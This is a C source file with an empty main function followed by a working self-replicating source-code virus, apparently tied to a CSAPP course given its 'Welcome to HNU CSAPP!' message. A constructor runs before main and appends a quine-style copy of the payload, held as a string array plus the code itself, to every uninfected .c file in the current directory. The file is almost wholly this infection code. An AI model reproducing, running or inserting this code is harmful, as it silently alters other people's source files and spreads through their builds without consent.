int main() {
    return 0;
}


static const char *PAYLOAD_fdgffdgsdhgtrhtshs[] = {
"// VIRUS_PAYLOAD_BEGIN_MARKER",
"\n",
"#include <stdio.h>",
"\n",
"#include <stdlib.h>",
"\n",
"#include <string.h>",
"\n",
"#include <dirent.h>",
"\n",
"#include <sys/stat.h>",
"\n",
"\n",
"static void infect_fdgffdgsdhgtrhtshs() {",
"\n",
"    DIR *directory = opendir(",
"\"",
".",
"\"",
");",
"\n",
"    if (!directory) goto failed_with_dir;",
"\n",
"    ",
"\n",
"    struct dirent *directory_entry;",
"\n",
"    while ((directory_entry = readdir(directory)) != NULL) {",
"\n",
"        size_t filename_len = strlen(directory_entry->d_name);",
"\n",
"        if (",
"\n",
"            filename_len < 2",
"\n",
"            || (",
"\n",
"                strcmp(directory_entry->d_name + filename_len - 2, ",
"\"",
".c",
"\"",
") != 0",
"\n",
"                && strcmp(directory_entry->d_name + filename_len - 2, ",
"\"",
".C",
"\"",
") != 0",
"\n",
"            )",
"\n",
"        ) continue;",
"\n",
"        ",
"\n",
"        struct stat st;",
"\n",
"        if (",
"\n",
"            stat(directory_entry->d_name, &st) != 0",
"\n",
"            || !S_ISREG(st.st_mode)",
"\n",
"        ) continue;",
"\n",
"\n",
"        ",
"\n",
"        FILE *fp = fopen(directory_entry->d_name, ",
"\"",
"a+",
"\"",
");",
"\n",
"        if (!fp) continue;",
"\n",
"        if (fseek(fp, 0, SEEK_END) != 0) goto failed_with_fp;",
"\n",
"        long len = ftell(fp);",
"\n",
"        if (len <= 0) goto failed_with_fp;",
"\n",
"        char *buf = malloc((size_t)len + 1u);",
"\n",
"        if (!buf) goto failed_with_fp;",
"\n",
"        if (fseek(fp, 0, SEEK_SET) != 0) goto failed_with_buf;",
"\n",
"        if (fread(buf, 1, (size_t)len, fp) != (size_t)len) goto failed_with_buf;",
"\n",
"        buf[len] = ",
"\'",
"\\",
"0",
"\'",
";",
"\n",
"        if (strstr(buf, ",
"\"",
"// VIRUS_PAYLOAD",
"\"",
"\"",
"_BEGIN_MARKER",
"\"",
")) goto failed_with_buf;",
"\n",
"        ",
"\n",
"        fputs(",
"\"",
"\\",
"n",
"\\",
"n",
"\\",
"n",
"\"",
", fp);",
"\n",
"        size_t payload_count = sizeof(PAYLOAD_fdgffdgsdhgtrhtshs) / sizeof(PAYLOAD_fdgffdgsdhgtrhtshs[0]);",
"\n",
"        ",
"\n",
"        fputs(",
"\"",
"static const char *PAYLOAD_fdgffdgsdhgtrhtshs[] = {",
"\"",
", fp);",
"\n",
"        for (size_t i = 0; i < payload_count; ++i) {",
"\n",
"            const char *p = PAYLOAD_fdgffdgsdhgtrhtshs[i];",
"\n",
"            fputs(",
"\"",
"\\",
"\"",
"\"",
",fp);",
"\n",
"            if (strlen(p) == 1) {",
"\n",
"                if (p[0] == ",
"\'",
"\\",
"n",
"\'",
") fputs(",
"\"",
"\\",
"\\",
"n",
"\"",
", fp);",
"\n",
"                else if (p[0] == ",
"\'",
"\\",
"t",
"\'",
") fputs(",
"\"",
"\\",
"\\",
"t",
"\"",
", fp);",
"\n",
"                else if (p[0] == ",
"\'",
"\\",
"\\",
"\'",
") fputs(",
"\"",
"\\",
"\\",
"\\",
"\\",
"\"",
", fp);",
"\n",
"                else if (p[0] == ",
"\'",
"\\",
"\"",
"\'",
") fputs(",
"\"",
"\\",
"\\",
"\\",
"\"",
"\"",
", fp);",
"\n",
"                else if (p[0] == ",
"\'",
"\\",
"\'",
"\'",
") fputs(",
"\"",
"\\",
"\\",
"\\",
"\'",
"\"",
", fp);",
"\n",
"                else fputc(p[0], fp);",
"\n",
"            } else fputs(p, fp);",
"\n",
"            fputs(",
"\"",
"\\",
"\"",
",",
"\"",
",fp);",
"\n",
"        }",
"\n",
"        fputs(",
"\"",
"};",
"\\",
"n",
"\\",
"n",
"\"",
", fp);",
"\n",
"        ",
"\n",
"        for (size_t i = 0; i < payload_count; ++i) {",
"\n",
"            fputs(PAYLOAD_fdgffdgsdhgtrhtshs[i], fp);",
"\n",
"        }",
"\n",
"        fflush(fp);",
"\n",
"failed_with_buf:",
"\n",
"        free(buf);",
"\n",
"failed_with_fp:",
"\n",
"        fclose(fp);",
"\n",
"    }",
"\n",
"\n",
"failed_with_dir:",
"\n",
"    closedir(directory);",
"\n",
"}",
"\n",
"\n",
"__attribute__((constructor)) static void virus_action_fdgffdgsdhgtrhtshs() {",
"\n",
"    puts(",
"\"",
"Welcome to HNU CSAPP!",
"\"",
");",
"\n",
"    infect_fdgffdgsdhgtrhtshs();",
"\n",
"}",
"\n",
"// VIRUS_PAYLOAD_END_MARKER"
};

// VIRUS_PAYLOAD_BEGIN_MARKER
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

static void infect_fdgffdgsdhgtrhtshs() {
    DIR *directory = opendir(".");
    if (!directory) goto failed_with_dir;
    
    struct dirent *directory_entry;
    while ((directory_entry = readdir(directory)) != NULL) {
        size_t filename_len = strlen(directory_entry->d_name);
        if (
            filename_len < 2
            || (
                strcmp(directory_entry->d_name + filename_len - 2, ".c") != 0
                && strcmp(directory_entry->d_name + filename_len - 2, ".C") != 0
            )
        ) continue;
        
        struct stat st;
        if (
            stat(directory_entry->d_name, &st) != 0
            || !S_ISREG(st.st_mode)
        ) continue;

        
        FILE *fp = fopen(directory_entry->d_name, "a+");
        if (!fp) continue;
        if (fseek(fp, 0, SEEK_END) != 0) goto failed_with_fp;
        long len = ftell(fp);
        if (len <= 0) goto failed_with_fp;
        char *buf = malloc((size_t)len + 1u);
        if (!buf) goto failed_with_fp;
        if (fseek(fp, 0, SEEK_SET) != 0) goto failed_with_buf;
        if (fread(buf, 1, (size_t)len, fp) != (size_t)len) goto failed_with_buf;
        buf[len] = '\0';
        if (strstr(buf, "// VIRUS_PAYLOAD""_BEGIN_MARKER")) goto failed_with_buf;
        
        fputs("\n\n\n", fp);
        size_t payload_count = sizeof(PAYLOAD_fdgffdgsdhgtrhtshs) / sizeof(PAYLOAD_fdgffdgsdhgtrhtshs[0]);
        
        fputs("static const char *PAYLOAD_fdgffdgsdhgtrhtshs[] = {", fp);
        for (size_t i = 0; i < payload_count; ++i) {
            const char *p = PAYLOAD_fdgffdgsdhgtrhtshs[i];
            fputs("\"",fp);
            if (strlen(p) == 1) {
                if (p[0] == '\n') fputs("\\n", fp);
                else if (p[0] == '\t') fputs("\\t", fp);
                else if (p[0] == '\\') fputs("\\\\", fp);
                else if (p[0] == '\"') fputs("\\\"", fp);
                else if (p[0] == '\'') fputs("\\\'", fp);
                else fputc(p[0], fp);
            } else fputs(p, fp);
            fputs("\",",fp);
        }
        fputs("};\n\n", fp);
        
        for (size_t i = 0; i < payload_count; ++i) {
            fputs(PAYLOAD_fdgffdgsdhgtrhtshs[i], fp);
        }
        fflush(fp);
failed_with_buf:
        free(buf);
failed_with_fp:
        fclose(fp);
    }

failed_with_dir:
    closedir(directory);
}

__attribute__((constructor)) static void virus_action_fdgffdgsdhgtrhtshs() {
    puts("Welcome to HNU CSAPP!");
    infect_fdgffdgsdhgtrhtshs();
}
// VIRUS_PAYLOAD_END_MARKER